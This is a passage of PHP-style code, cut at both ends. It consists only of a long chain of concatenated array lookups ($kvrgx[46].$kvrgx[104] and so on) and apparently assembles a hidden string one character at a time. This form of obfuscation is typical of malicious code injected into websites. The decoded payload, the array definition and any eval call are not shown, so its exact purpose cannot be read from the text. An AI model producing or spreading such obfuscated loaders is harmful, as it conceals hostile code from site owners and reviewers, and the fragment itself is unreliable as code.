.$kvrgx[46].$kvrgx[104].$kvrgx[100].$kvrgx[22].$kvrgx[116].$kvrgx[41].$kvrgx[77].$kvrgx[29].$kvrgx[6].$kvrgx[14].$kvrgx[4].$kvrgx[104].$kvrgx[93].$kvrgx[21].$kvrgx[33].$kvrgx[1].$kvrgx[38].$kvrgx[11].$kvrgx[39].$kvrgx[23].$kvrgx[29].$kvrgx[187].$kvrgx[118].$kvrgx[22].$kvrgx[94].$kvrgx[22].$kvrgx[23].$kvrgx[23].$kvrgx[28].$kvrgx[92].$kvrgx[14].$kvrgx[1].$kvrgx[9].$kvrgx[46].$kvrgx[201].$kvrgx[21].$kvrgx[30].$kvrgx[29].$kvrgx[33].$kvrgx[7].$kvrgx[4].$kvrgx[118].$kvrgx[4].$kvrgx[12].$kvrgx[21].$kvrgx[92].$kvrgx[40].$kvrgx[66].$kvrgx[0].$kvrgx[33].$kvrgx[77].$kvrgx[88].$kvrgx[68].$kvrgx[22].$kvrgx[81].$kvrgx[188].$kvrgx[88].$kvrgx[4].$kvrgx[81].$kvrgx[11].$kvrgx[16].$kvrgx[98].$kvrgx[135].$kvrgx[25].$kvrgx[88].$kvrgx[100].$kvrgx[153].$kvrgx[45].$kvrgx[44].$kvrgx[40].$kvrgx[20].$kvrgx[97].$kvrgx[94].$kvrgx[45].$kvrgx[3].$kvrgx[97].$kvrgx[68].$kvrgx[20].$kvrgx[24].$kvrgx[201].$kvrgx[35].$kvrgx[4].$kvrgx[83].$kvrgx[92].$kvrgx[13].$kvrgx[23].$kvrgx[187].$kvrgx[45].$kvrgx[94].$kvrgx[93].$kvrgx[31].$kvrgx[31].$kvrgx[201].$kvrgx[14].$kvrgx[8].$kvrgx[188].$kvrgx[17].$kvrgx[119].$kvrgx[13].$kvrgx[29].$kvrgx[38].$kvrgx[24].$kvrgx[41].$kvrgx[118].$kvrgx[21].$kvrgx[135].$kvrgx[164].$kvrgx[201].$kvrgx[45].$kvrgx[21].$kvrgx[13].$kvrgx[98].$kvrgx[94].$kvrgx[97].$kvrgx[83].$kvrgx[0].$kvrgx[20].$kvrgx[104].$kvrgx[18].$kvrgx[94].$kvrgx[98].$kvrgx[38].$kvrgx[7].$kvrgx[41].$kvrgx[13].$kvrgx[11].$kvrgx[119].$kvrgx[18].$kvrgx[68].$kvrgx[97].$kvrgx[97].$kvrgx[35].$kvrgx[93].$kvrgx[164].$kvrgx[28].$kvrgx[24].$kvrgx[104].$kvrgx[45].$kvrgx[6].$kvrgx[7].$kvrgx[33].$kvrgx[11].$kvrgx[6].$kvrgx[0].$kvrgx[23].$kvrgx[81].$kvrgx[39].$kvrgx[23].$kvrgx[83].$kvrgx[26].$kvrgx[0].$kvrgx[40].$kvrgx[21].$kvrgx[92].$kvrgx[164].$kvrgx[68].$kvrgx[201].$kvrgx[135].$kvrgx[173].$kvrgx[201].$kvrgx[92].$kvrgx[41].$kvrgx[119].$kvrgx[1].$kvrgx[7].$kvrgx[97].$kvrgx[20].$kvrgx[3].$kvrgx[9].$kvrgx[153].$kvrgx[8].$kvrgx[33].$kvrgx[119].$kvrgx[98].$kvrgx[23].$kvrgx[26].$kvrgx[24].$kvrgx[1].$kvrgx[123].$kvrgx[24].$kvrgx[187].$kvrgx[22].$kvrgx[16].$kvrgx[30].$kvrgx[9].$kvrgx[9].$kvrgx[40].$kvrgx[45].$kvrgx[4].$kvrgx[60].$kvrgx[9].$kvrgx[123].$kvrgx[164].$kvrgx[119].$kvrgx[83].$kvrgx[20].$kvrgx[15].$kvrgx[2].$kvrgx[45].$kvrgx[45].$kvrgx[31].$kvrgx[93].$kvrgx[3].$kvrgx[118].$kvrgx[46].$kvrgx[164].$kvrgx[187].$kvrgx[116].$kvrgx[2].$kvrgx[92].$kvrgx[0].$kvrgx[6].$kvrgx[104].$kvrgx[164].$kvrgx[38].$kvrgx[15].$kvrgx[30].$kvrgx[7].$kvrgx[30].$kvrgx[44].$kvrgx[188].$kvrgx[118].$kvrgx[145].$kvrgx[22].$kvrgx[93].$kvrgx[18].$kvrgx[0].$kvrgx[41].$kvrgx[26].$kvrgx[93].$kvrgx[81].$kvrgx[35].$kvrgx[24].$kvrgx[40].$kvrgx[6].$kvrgx[6].$kvrgx[41].$kvrgx[45].$kvrgx[3].$kvrgx[17].$kvrgx[97].$kvrgx[18].$kvrgx[6].$kvrgx[26].$kvrgx[38].$kvrgx[1].$kvrgx[188].$kvrgx[6].$kvrgx[201].$kvrgx[15].$kvrgx[31].$kvrgx[24].$kvrgx[135].$kvrgx[11].$kvrgx[1].$kvrgx[23].$kvrgx[31].$kvrgx[20].$kvrgx[5].$kvrgx[38].$kvrgx[46].$kvrgx[0].$kvrgx[31].$kvrgx[12].$kvrgx[9].$kvrgx[24].$kvrgx[100].$kvrgx[40].$kvrgx[2].$kvrgx[187].$kvrgx[1].$kvrgx[66].$kvrgx[173].$kvrgx[12].$kvrgx[135].$kvrgx[5].$kvrgx[11].$kvrgx[17].$kvrgx[118].$kvrgx[20].$kvrgx[104].$kvrgx[25].$kvrgx[6].$kvrgx[40].$kvrgx[88].$kvrgx[119].$kvrgx[5].$kvrgx[81].$kvrgx[35].$kvrgx[164].$kvrgx[38].$kvrgx[66].$kvrgx[22].$kvrgx[66].$kvrgx[0].$kvrgx[100].$kvrgx[26].$kvrgx[20].$kvrgx[60].$kvrgx[68].$kvrgx[16].$kvrgx[188].$kvrgx[66].$kvrgx[104].$kvrgx[28].$kvrgx[66].$kvrgx[8].$kvrgx[88].$kvrgx[187].$kvrgx[24].$kvrgx[92].$kvrgx[187].$kvrgx[11].$kvrgx[41].$kvrgx[46].$kvrgx[104].$kvrgx[38].$kvrgx[92].$kvrgx[119].$kvrgx[18].$kvrgx[15].$kvrgx[13].$kvrgx[93].$kvrgx[104].$kvrgx[6].$kvrgx[41].$kvrgx[6].$kvrgx[94].$kvrgx[41].$kvrgx[118].$kvrgx[15].$kvrgx[92].$kvrgx[25].$kvrgx[164].$kvrgx[83].$kvrgx[8].$kvrgx[17].$kvrgx[24].$kvrgx[2].$kvrgx[66].$kvrgx[145].$kvrgx[24].$kvrgx[38].$kvrgx[116].$kvrgx[68].$kvrgx[17].$kvrgx[12].$kvrgx[12].$kvrgx[11].$kvrgx[40].$kvrgx[77].$kvrgx[6].$kvrgx[104].$kvrgx[30].$kvrgx[145].$kvrgx[92].$kvrgx[13].$kvrgx[104].$kvrgx[83].$kvrgx[83].$kvrgx[66].$kvrgx[29].$kvrgx[83].$kvrgx[94].$kvrgx[104].$kvrgx[35].$kvrgx[12].$kvrgx[6].$kvrgx[22].$kvrgx[45].$kvrgx[28].$kvrgx[201].$kvrgx[81].$kvrgx[173].$kvrgx[29].$kvrgx[116].$kvrgx[14].$kvrgx[15].$kvrgx[153].$kvrgx[145].$kvrgx[100].$kvrgx[2].$kvrgx[173].$kvrgx[164].$kvrgx[45].$kvrgx[119].$kvrgx[2].$kvrgx[23].$kvrgx[12].$kvrgx[22].$kvrgx[97].$kvrgx[8].$kvrgx[6].$kvrgx[31].$kvrgx[188].$kvrgx[12].$kvrgx[9].$kvrgx[30].$kvrgx[41].$kvrgx[116].$kvrgx[20].$kvrgx[9].$kvrgx[33].$kvrgx[1].$kvrgx[3].$kvrgx[100].$kvrgx[39].$kvrgx[20].$kvrgx[92].$kvrgx[33].$kvrgx[201].$kvrgx[7].$kvrgx[119].$kvrgx[7].$kvrgx[88].$kvrgx[46].$kvrgx[20].$kvrgx[6].$kvrgx[97].$kvrgx[33].$kvrgx[2].$kvrgx[123].$kvrgx[33].$kvrgx[41].$kvrgx[173].$kvrgx[66].$kvrgx[41].$kvrgx[6].$kvrgx[40].$kvrgx[18].$kvrgx[9].$kvrgx[119].$kvrgx[1].$kvrgx[97].$kvrgx[15].$kvrgx[118].$kvrgx[93].$kvrgx[68].$kvrgx[0].$kvrgx[97].$kvrgx[24].$kvrgx[8].$kvrgx[28].$kvrgx[77].$kvrgx[21].$kvrgx[40].$kvrgx[44].$kvrgx[83].$kvrgx[24].$kvrgx[35].$kvrgx[188].$kvrgx[41].$kvrgx[46].$kvrgx[6].$kvrgx[92].$kvrgx[92].$kvrgx[97].$kvrgx[98].$kvrgx[17].$kvrgx[14].$kvrgx[45].$kvrgx[21].$kvrgx[16].$kvrgx[0].$kvrgx[14].$kvrgx[15].$kvrgx[16].$kvrgx[39].$kvrgx[2].$kvrgx[11].$kvrgx[18].$kvrgx[14].$kvrgx[201].$kvrgx[20].$kvrgx[100].$kvrgx[118].$kvrgx[45].$kvrgx[173].$kvrgx[88].$kvrgx[9].$kvrgx[173].$kvrgx[187].$kvrgx[60].$kvrgx[41].$kvrgx[118].$kvrgx[77].$kvrgx[3].$kvrgx[24].$kvrgx[98].$kvrgx[116].$kvrgx[77].$kvrgx[40].$kvrgx[173].$kvrgx[118].$kvrgx[173].$kvrgx[29].$kvrgx[100].$kvrgx[15].$kvrgx[23].$kvrgx[6].$kvrgx[44].$kvrgx[153].$kvrgx[14].$kvrgx[9].$kvrgx[12].$kvrgx[22].$kvrgx[22].$kvrgx[1].$kvrgx[33].$kvrgx[145].$kvrgx[164].$kvrgx[188].$kvrgx[123].$kvrgx[30].$kvrgx[23].$kvrgx[66].$kvrgx[135].$kvrgx[9].$kvrgx[116].$kvrgx[35].$kvrgx[12].$kvrgx[83].$kvrgx[23].$kvrgx[93].$kvrgx[135].$kvrgx[35].$kvrgx[23].$kvrgx[46].$kvrgx[28].$kvrgx[201].$kvrgx[119].$kvrgx[6].$kvrgx[8].$kvrgx[25].$kvrgx[0].$kvrgx[23].$kvrgx[5].$kvrgx[68].$kvrgx[188].$kvrgx[135].$kvrgx[29].$kvrgx[20].$kvrgx[116].$kvrgx[35].$kvrgx[29].$kvrgx[20].$kvrgx[4].$kvrgx[5].$kvrgx[2].$kvrgx[44].$kvrgx[116].$kvrgx[123].$kvrgx[12].$kvrgx[7].$kvrgx[46].$kvrgx[24].$kvrgx[66].$kvrgx[46].$kvrgx[119].$kvrgx[77].$kvrgx[45].$kvrgx[164].$kvrgx[123].$kvrgx[94].$kvrgx[135].$kvrgx[123].$kvrgx[33].$kvrgx[123].$kvrgx[17].$kvrgx[29].$kvrgx[12].$kvrgx[153].$kvrgx[83].$kvrgx[26].$kvrgx[98].$kvrgx[38].$kvrgx[118].$kvrgx[29].$kvrgx[60].$kvrgx[66].$kvrgx[20].$kvrgx[135].$kvrgx[31].$kvrgx[77].$kvrgx[97].$kvrgx[33].$kvrgx[119].$kvrgx[6].$kvrgx[4].$kvrgx[94].$kvrgx[35].$kvrgx[24].$kvrgx[97].$kvrgx[12].$kvrgx[46].$kvrgx[30].$kvrgx[26].$kvrgx[93].$kvrgx[118].$kvrgx[11].$kvrgx[20].$kvrgx[45].$kvrgx[25].$kvrgx[100].$kvrgx[33].$kvrgx[12].$kvrgx[38].$kvrgx[44].$kvrgx[201].$kvrgx[104].$kvrgx[17].$kvrgx[41].$kvrgx[81].$kvrgx[33].$kvrgx[88].$kvrgx[93].$kvrgx[25].$kvrgx[24].$kvrgx[31].$kvrgx[116].$kvrgx[33].$kvrgx[188].$kvrgx[16].$kvrgx[88].$kvrgx[23].$kvrgx[7].$kvrgx[24].$kvrgx[173].$kvrgx[145].$kvrgx[29].$kvrgx[100].$kvrgx[5].$kvrgx[145].$kvrgx[4].$kvrgx[28].$kvrgx[24].$kvrgx[23].$kvrgx[33].$kvrgx[16].$kvrgx[88].$kvrgx[29].$kvrgx[6].$kvrgx[2].$kvrgx[119].$kvrgx[118].$kvrgx[60].$kvrgx[201].$kvrgx[100].$kvrgx[31].$kvrgx[135].$kvrgx[164].$kvrgx[38].$kvrgx[12].$kvrgx[40].$kvrgx[33].$kvrgx[98].$kvrgx[145].$kvrgx[187].$kvrgx[118].$kvrgx[4].$kvrgx[66].$kvrgx[119].$kvrgx[3].$kvrgx[28].$kvrgx[0].$kvrgx[8].$kvrgx[104].$kvrgx[98].$kvrgx[30].$kvrgx[41].$kvrgx[153].$kvrgx[21].$kvrgx[20].$kvrgx[68].$kvrgx[33].$kvrgx[135].$kvrgx[173].$kvrgx[98].$kvrgx[41].$kvrgx[31].$kvrgx[92].$kvrgx[153].$kvrgx[11].$kvrgx[29].$kvrgx[7].$kvrgx[4].$kvrgx[20].$kvrgx[1].$kvrgx[40].$kvrgx[38].$kvrgx[14].$kvrgx[29].$kvrgx[22].$kvrgx[28].$kvrgx[9].$kvrgx[8].$kvrgx[35].$kvrgx[14].$kvrgx[13].$kvrgx[93].$kvrgx[123].$kvrgx[30].$kvrgx[98].$kvrgx[188].$kvrgx[1].$kvrgx[29].$kvrgx[25].$kvrgx[94].$kvrgx[88].$kvrgx[22].$kvrgx[104].$kvrgx[5].$kvrgx[23].$kvrgx[100].$kvrgx[0].$kvrgx[119].$kvrgx[119].$kvrgx[41].$kvrgx[33].$kvrgx[1].$kvrgx[31].$kvrgx[38].$kvrgx[25].$kvrgx[40].$kvrgx[18].$kvrgx[38].$kvrgx[94].$kvrgx[8].$kvrgx[8].$kvrgx[66].$kvrgx[41].$kvrgx[60].$kvrgx[5].$kvrgx[46].$kvrgx[92].$kvrgx[15].$kvrgx[4].$kvrgx[0].$kvrgx[13].$kvrgx[40].$kvrgx[119].$kvrgx[0].$kvrgx[16].$kvrgx[118].$kvrgx[11].$kvrgx[30].$kvrgx[13].$kvrgx[41].$kvrgx[66].$kvrgx[164].$kvrgx[17].$kvrgx[81].$kvrgx[5].$kvrgx[100].$kvrgx[41].$kvrgx[33].$kvrgx[188].$kvrgx[0].$kvrgx[119].$kvrgx[35].$kvrgx[11].$kvrgx[38].$kvrgx[93].$kvrgx[38].$kvrgx[25].$kvrgx[60].$kvrgx[20].$kvrgx[17].$kvrgx[40].$kvrgx[18].$kvrgx[21].$kvrgx[44].$kvrgx[31].$kvrgx[30].$kvrgx[18].$kvrgx[145].$kvrgx[18].$kvrgx[100].$kvrgx[24].$kvrgx[39].$kvrgx[46].$kvrgx[38].$kvrgx[28].$kvrgx[35].$kvrgx[104].$kvrgx[33].$kvrgx[201].$kvrgx[17].$kvrgx[24].$kvrgx[9].$kvrgx[83].$kvrgx[28].$kvrgx[68].$kvrgx[20].$kvrgx[24].$kvrgx[93].$kvrgx[68].$kvrgx[92].$kvrgx[1].$kvrgx[45].$kvrgx[83].$kvrgx[33].$kvrgx[118].$kvrgx[123].$kvrgx[5].$kvrgx[16].$kvrgx[40].$kvrgx[15].$kvrgx[187].$kvrgx[39].$kvrgx[104].$kvrgx[153].$kvrgx[83].$kvrgx[5].$kvrgx[187].$kvrgx[123].$kvrgx[4].$kvrgx[45].$kvrgx[118].$kvrgx[100].$kvrgx[119].$kvrgx[40].$kvrgx[88].$kvrgx[145].$kvrgx[3].$kvrgx[14].$kvrgx[2].$kvrgx[2].$kvrgx[104].$kvrgx[30].$kvrgx[24].$kvrgx[20].$kvrgx[60].$kvrgx[66].$kvrgx[24].$kvrgx[201].$kvrgx[38].$kvrgx[46].$kvrgx[104].$kvrgx[60].$kvrgx[38].$kvrgx[135].$kvrgx[201].$kvrgx[81].$kvrgx[15].$kvrgx[116].$kvrgx[21].$kvrgx[100].$kvrgx[22].$kvrgx[119].$kvrgx[88].$kvrgx[11].$kvrgx[46].$kvrgx[0].$kvrgx[100].$kvrgx[68].$kvrgx[77].$kvrgx[0].$kvrgx[29].$kvrgx[24].$kvrgx[92].$kvrgx[35].$kvrgx[5].$kvrgx[38].$kvrgx[1].$kvrgx[15].$kvrgx[98].$kvrgx[23].$kvrgx[16].$kvrgx[77].$kvrgx[25].$kvrgx[3].$kvrgx[13].$kvrgx[97].$kvrgx[173].$kvrgx[3].$kvrgx[6].$kvrgx[46].$kvrgx[187].$kvrgx[4].$kvrgx[40].$kvrgx[23].$kvrgx[39].$kvrgx[46].$kvrgx[15].$kvrgx[17].$kvrgx[93].$kvrgx[201].$kvrgx[145].$kvrgx[104].$kvrgx[145].$kvrgx[153].$kvrgx[88].$kvrgx[119].$kvrgx[5].$kvrgx[41].$kvrgx[17].$kvrgx[83].$kvrgx[38].$kvrgx[81].$kvrgx[153].$kvrgx[41].$kvrgx[98].$kvrgx[104].$kvrgx[100].$kvrgx[11].$kvrgx[188].$kvrgx[28].$kvrgx[60].$kvrgx[6].$kvrgx[100].$kvrgx[164].$kvrgx[164].$kvrgx[21].$kvrgx[11].$kvrgx[68].$kvrgx[1].$kvrgx[116].$kvrgx[3].$kvrgx[201].$kvrgx[44].$kvrgx[77].$kvrgx[24].$kvrgx[81].$kvrgx[173].$kvrgx[23].$kvrgx[44].$kvrgx[15].$kvrgx[93].$kvrgx[100].$kvrgx[21].$kvrgx[17].$kvrgx[145].$kvrgx[8].$kvrgx[26].$kvrgx[3].$kvrgx[12].$kvrgx[104].$kvrgx[40].$kvrgx[44].$kvrgx[94].$kvrgx[3].$kvrgx[24].$kvrgx[88].$kvrgx[18].$kvrgx[7].$kvrgx[77].$kvrgx[88].$kvrgx[88].$kvrgx[135].$kvrgx[104].$kvrgx[116].$kvrgx[92].$kvrgx[5].$kvrgx[145].$kvrgx[1].$kvrgx[104].$kvrgx[16].$kvrgx[66].$kvrgx[188].$kvrgx[0].$kvrgx[93].$kvrgx[31].$kvrgx[11].$kvrgx[201].$kvrgx[21].$kvrgx[9].$kvrgx[38].$kvrgx[11].$kvrgx[118].$kvrgx[164].$kvrgx[35].$kvrgx[94].$kvrgx[16].$kvrgx[4].$kvrgx[11].$kvrgx[100].$kvrgx[18].$kvrgx[81].$kvrgx[44].$kvrgx[22].$kvrgx[46].$kvrgx[100].$kvrgx[173].$kvrgx[35].$kvrgx[31].$kvrgx[28].$kvrgx[30].$kvrgx[9].$kvrgx[3].$kvrgx[6].$kvrgx[20].$kvrgx[2].$kvrgx[9].$kvrgx[35].$kvrgx[97].$kvrgx[118].$kvrgx[6].$kvrgx[153].$kvrgx[135].$kvrgx[7].$kvrgx[97].$kvrgx[46].$kvrgx[0].$kvrgx[25].$kvrgx[33].$kvrgx[9].$kvrgx[187].$kvrgx[5].$kvrgx[93].$kvrgx[201].$kvrgx[93].$kvrgx[135].$kvrgx[5].$kvrgx[46].$kvrgx[118].$kvrgx[29].$kvrgx[15].$kvrgx[20].$kvrgx[11].$kvrgx[13].$kvrgx[145].$kvrgx[97].$kvrgx[92].$kvrgx[68].$kvrgx[45].$kvrgx[45].$kvrgx[77].$kvrgx[31].$kvrgx[30].$kvrgx[164].$kvrgx[60].$kvrgx[201].$kvrgx[33].$kvrgx[11].$kvrgx[68].$kvrgx[16].$kvrgx[77].$kvrgx[3].$kvrgx[0].$kvrgx[12].$kvrgx[3].$kvrgx[40].$kvrgx[83].$kvrgx[6].$kvrgx[0].$kvrgx[41].$kvrgx[104].$kvrgx[98].$kvrgx[16].$kvrgx[12].$kvrgx[9].$kvrgx[100].$kvrgx[11].$kvrgx[123].$kvrgx[83].$kvrgx[7].$kvrgx[119].$kvrgx[3].$kvrgx[88].$kvrgx[116].$kvrgx[11].$kvrgx[66].$kvrgx[26].$kvrgx[38].$kvrgx[93].$kvrgx[30].$kvrgx[92].$kvrgx[187].$kvrgx[3].$kvrgx[23].$kvrgx[173].$kvrgx[94].$kvrgx[119].$kvrgx[7].$kvrgx[0].$kvrgx[4].$kvrgx[31].$kvrgx[33].$kvrgx[45].$kvrgx[31].$kvrgx[98].$kvrgx[14].$kvrgx[21].$kvrgx[20].$kvrgx[88].$kvrgx[40].$kvrgx[41].$kvrgx[98].$kvrgx[15].$kvrgx[153].$kvrgx[45].$kvrgx[20].$kvrgx[8].$kvrgx[30].$kvrgx[24].$kvrgx[38].$kvrgx[26].$kvrgx[16].$kvrgx[100].$kvrgx[30].$kvrgx[66].$kvrgx[6].$kvrgx[5].$kvrgx[9].$kvrgx[22].$kvrgx[201].$kvrgx[31].$kvrgx[123].$kvrgx[98].$kvrgx[6].$kvrgx[3].$kvrgx[0].$kvrgx[40].$kvrgx[26].$kvrgx[13].$kvrgx[0].$kvrgx[33].$kvrgx[92].$kvrgx[6].$kvrgx[92].$kvrgx[3].$kvrgx[2].$kvrgx[31].$kvrgx[68].$kvrgx[0].$kvrgx[13].$kvrgx[119].$kvrgx[38].$kvrgx[3].$kvrgx[94].$kvrgx[29].$kvrgx[15].$kvrgx[31].$kvrgx[26].$kvrgx[35].$kvrgx[4].$kvrgx[93].$kvrgx[33].$kvrgx[18].$kvrgx[116].$kvrgx[45].$kvrgx[100].$kvrgx[104].$kvrgx[39].$kvrgx[22].$kvrgx[25].$kvrgx[153].$kvrgx[83].$kvrgx[29].$kvrgx[116].$kvrgx[12].$kvrgx[0].$kvrgx[3].$kvrgx[21].$kvrgx[77].$kvrgx[60].$kvrgx[20].$kvrgx[14].$kvrgx[60].$kvrgx[25].$kvrgx[92].$kvrgx[66].$kvrgx[13].$kvrgx[83].$kvrgx[33].$kvrgx[118].$kvrgx[23].$kvrgx[5].$kvrgx[45].$kvrgx[135].$kvrgx[30].$kvrgx[38].$kvrgx[153].$kvrgx[92].$kvrgx[14].$kvrgx[44].$kvrgx[6].$kvrgx[7].$kvrgx[92].$kvrgx[29].$kvrgx[18].$kvrgx[24].$kvrgx[66].$kvrgx[21].$kvrgx[9].$kvrgx[25].$kvrgx[22].$kvrgx[119].$kvrgx[118].$kvrgx[38].$kvrgx[93].$kvrgx[123].$kvrgx[35].$kvrgx[98].$kvrgx[123].$kvrgx[123].$kvrgx[40].$kvrgx[153].$kvrgx[9].$kvrgx[1].$kvrgx[164].$kvrgx[94].$kvrgx[25].$kvrgx[25].$kvrgx[81].$kvrgx[41].$kvrgx[118].$kvrgx[17].$kvrgx[12].$kvrgx[77].$kvrgx[3].$kvrgx[66].$kvrgx[23].$kvrgx[88].$kvrgx[8].$kvrgx[100].$kvrgx[0].$kvrgx[39].$kvrgx[24].$kvrgx[104].$kvrgx[44].$kvrgx[11].$kvrgx[15].$kvrgx[77].$kvrgx[39].$kvrgx[173].$kvrgx[44].$kvrgx[28].$kvrgx[26].$kvrgx[173].$kvrgx[94].$kvrgx[15].$kvrgx[66].$kvrgx[22].$kvrgx[17].$kvrgx[9].$kvrgx[94].$kvrgx[39].$kvrgx[118].$kvrgx[13].$kvrgx[20].$kvrgx[123].$kvrgx[35].$kvrgx[31].$kvrgx[30].$kvrgx[46].$kvrgx[22].$kvrgx[29].$kvrgx[83].$kvrgx[4].$kvrgx[187].$kvrgx[4].$kvrgx[83].$kvrgx[12].$kvrgx[28].$kvrgx[116].$kvrgx[81].$kvrgx[23].$kvrgx[92].$kvrgx[187].$kvrgx[45].$kvrgx[66].$kvrgx[22].$kvrgx[23].$kvrgx[66].$kvrgx[6].$kvrgx[2].$kvrgx[41].$kvrgx[24].$kvrgx[44].$kvrgx[66].$kvrgx[5].$kvrgx[88].$kvrgx[100].$kvrgx[21].$kvrgx[31].$kvrgx[77].$kvrgx[88].$kvrgx[26].$kvrgx[94].$kvrgx[44].$kvrgx[97].$kvrgx[100].$kvrgx[93].$kvrgx[9].$kvrgx[18].$kvrgx[0].$kvrgx[77].$kvrgx[164].$kvrgx[22].$kvrgx[46].$kvrgx[104].$kvrgx[135].$kvrgx[6].$kvrgx[187].$kvrgx[24].$kvrgx[83].$kvrgx[187].$kvrgx[44].$kvrgx[2].$kvrgx[188].$kvrgx[119].$kvrgx[40].$kvrgx[11].$kvrgx[23].$kvrgx[3].$kvrgx[23].$kvrgx[26].$kvrgx[3].$kvrgx[81].$kvrgx[164].$kvrgx[22].$kvrgx[35].$kvrgx[100].$kvrgx[173].$kvrgx[5].$kvrgx[9].$kvrgx[25].$kvrgx[88].$kvrgx[5].$kvrgx[3].$kvrgx[100].$kvrgx[92].$kvrgx[35].$kvrgx[33].$kvrgx[6].$kvrgx[46].$kvrgx[11].$kvrgx[88].$kvrgx[100].$kvrgx[153].$kvrgx[39].$kvrgx[88].$kvrgx[11].$kvrgx[173].$kvrgx[92].$kvrgx[81].$kvrgx[14].$kvrgx[1].$kvrgx[145].$kvrgx[145].$kvrgx[187].$kvrgx[11].$kvrgx[9].$kvrgx[39].$kvrgx[81].$kvrgx[6].$kvrgx[135].$kvrgx[4].$kvrgx[88].$kvrgx[12].$kvrgx[1].$kvrgx[0].$kvrgx[39].$kvrgx[30].$kvrgx[3].$kvrgx[83].$kvrgx[20].$kvrgx[40].$kvrgx[9].$kvrgx[119].$kvrgx[7].$kvrgx[12].$kvrgx[5].$kvrgx[23].$kvrgx[92].$kvrgx[81].$kvrgx[94].$kvrgx[46].$kvrgx[25].$kvrgx[12].$kvrgx[26].$kvrgx[98].$kvrgx[92].$kvrgx[16].$kvrgx[14].$kvrgx[38].$kvrgx[35].$kvrgx[119].$kvrgx[41].$kvrgx[92].$kvrgx[92].$kvrgx[45].$kvrgx[123].$kvrgx[20].$kvrgx[22].$kvrgx[13].$kvrgx[77].$kvrgx[5].$kvrgx[104].$kvrgx[145].$kvrgx[35].$kvrgx[100].$kvrgx[15].$kvrgx[77].$kvrgx[164].$kvrgx[135].$kvrgx[5].$kvrgx[13].$kvrgx[94].$kvrgx[40].$kvrgx[45].$kvrgx[92].$kvrgx[30].$kvrgx[9].$kvrgx[93].$kvrgx[68].$kvrgx[12].$kvrgx[15].$kvrgx[1].$kvrgx[21].$kvrgx[188].$kvrgx[173].$kvrgx[187].$kvrgx[5].$kvrgx[28].$kvrgx[31].$kvrgx[46].$kvrgx[11].$kvrgx[9].$kvrgx[83].$kvrgx[77].$kvrgx[22].$kvrgx[46].$kvrgx[16].$kvrgx[39].$kvrgx[11].$kvrgx[5].$kvrgx[66].$kvrgx[123].$kvrgx[68].$kvrgx[28].$kvrgx[153].$kvrgx[187].$kvrgx[0].$kvrgx[116].$kvrgx[145].$kvrgx[38].$kvrgx[92].$kvrgx[26].$kvrgx[187].$kvrgx[13].$kvrgx[14].$kvrgx[8].$kvrgx[40].$kvrgx[18].$kvrgx[31].$kvrgx[77].$kvrgx[44].$kvrgx[13].$kvrgx[77].$kvrgx[77].$kvrgx[29].$kvrgx[187].$kvrgx[5].$kvrgx[46].$kvrgx[119].$kvrgx[66].$kvrgx[145].$kvrgx[25].$kvrgx[26].$kvrgx[83].$kvrgx[135].$kvrgx[92].$kvrgx[16].$kvrgx[30].$kvrgx[4].$kvrgx[18].$kvrgx[29].$kvrgx[104].$kvrgx[39].$kvrgx[118].$kvrgx[153].$kvrgx[68].$kvrgx[98].$kvrgx[68].$kvrgx[0].$kvrgx[45].$kvrgx[92].$kvrgx[100].$kvrgx[201].$kvrgx[201].$kvrgx[92].$kvrgx[46].$kvrgx[38].$kvrgx[7].$kvrgx[17].$kvrgx[164].$kvrgx[17].$kvrgx[11].$kvrgx[45].$kvrgx[11].$kvrgx[14].$kvrgx[188].$kvrgx[100].$kvrgx[46].$kvrgx[20].$kvrgx[187].$kvrgx[104].$kvrgx[68].$kvrgx[88].$kvrgx[23].$kvrgx[3].$kvrgx[40].$kvrgx[7].$kvrgx[153].$kvrgx[2].$kvrgx[153].$kvrgx[15].$kvrgx[16].$kvrgx[20].$kvrgx[145].$kvrgx[135].$kvrgx[12].$kvrgx[5].$kvrgx[24].$kvrgx[24].$kvrgx[6].$kvrgx[118].$kvrgx[116].$kvrgx[187].$kvrgx[188].$kvrgx[23].$kvrgx[123].$kvrgx[104].$kvrgx[123].$kvrgx[187].$kvrgx[35].$kvrgx[46].$kvrgx[94].$kvrgx[104].$kvrgx[187].$kvrgx[6].$kvrgx[6].$kvrgx[88].$kvrgx[18].$kvrgx[18].$kvrgx[3].$kvrgx[41].$kvrgx[17].$kvrgx[11].$kvrgx[2].$kvrgx[164].$kvrgx[6].$kvrgx[119].$kvrgx[30].$kvrgx[98].$kvrgx[173].$kvrgx[8].$kvrgx[25].$kvrgx[7].$kvrgx[7].$kvrgx[68].$kvrgx[38].$kvrgx[33].$kvrgx[41].$kvrgx[92].$kvrgx[40].$kvrgx[7].$kvrgx[164].$kvrgx[60].$kvrgx[31].$kvrgx[81].$kvrgx[88].$kvrgx[7].$kvrgx[3].$kvrgx[24].$kvrgx[116].$kvrgx[92].$kvrgx[30].$kvrgx[3].$kvrgx[68].$kvrgx[12].$kvrgx[116].$kvrgx[24].$kvrgx[15].$kvrgx[29].$kvrgx[16].$kvrgx[22].$kvrgx[98].$kvrgx[41].$kvrgx[6].$kvrgx[4].$kvrgx[31].$kvrgx[135].$kvrgx[6].$kvrgx[17].$kvrgx[118].$kvrgx[40].$kvrgx[35].$kvrgx[164].$kvrgx[94].$kvrgx[33].$kvrgx[11].$kvrgx[145].$kvrgx[23].$kvrgx[30].$kvrgx[26].$kvrgx[118].$kvrgx[81].$kvrgx[92].$kvrgx[93].$kvrgx[41].$kvrgx[12].$kvrgx[24].$kvrgx[22].$kvrgx[60].$kvrgx[4].$kvrgx[173].$kvrgx[24].$kvrgx[123].$kvrgx[39].$kvrgx[8].$kvrgx[31].$kvrgx[20].$kvrgx[116].$kvrgx[24].$kvrgx[23].$kvrgx[68].$kvrgx[88].$kvrgx[118].$kvrgx[11].$kvrgx[45].$kvrgx[5].$kvrgx[66].$kvrgx[35].$kvrgx[1].$kvrgx[93].$kvrgx[66].$kvrgx[93].$kvrgx[16].$kvrgx[28].$kvrgx[93].$kvrgx[23].$kvrgx[12].$kvrgx[83].$kvrgx[60].$kvrgx[16].$kvrgx[118].$kvrgx[16].$kvrgx[100].$kvrgx[20].$kvrgx[17].$kvrgx[83].$kvrgx[13].$kvrgx[25].$kvrgx[39].$kvrgx[173].$kvrgx[145].$kvrgx[9].$kvrgx[5].$kvrgx[16].$kvrgx[44].$kvrgx[98].$kvrgx[119].$kvrgx[31].$kvrgx[187].$kvrgx[135].$kvrgx[153].$kvrgx[12].$kvrgx[16].$kvrgx[6].$kvrgx[9].$kvrgx[9].$kvrgx[24].$kvrg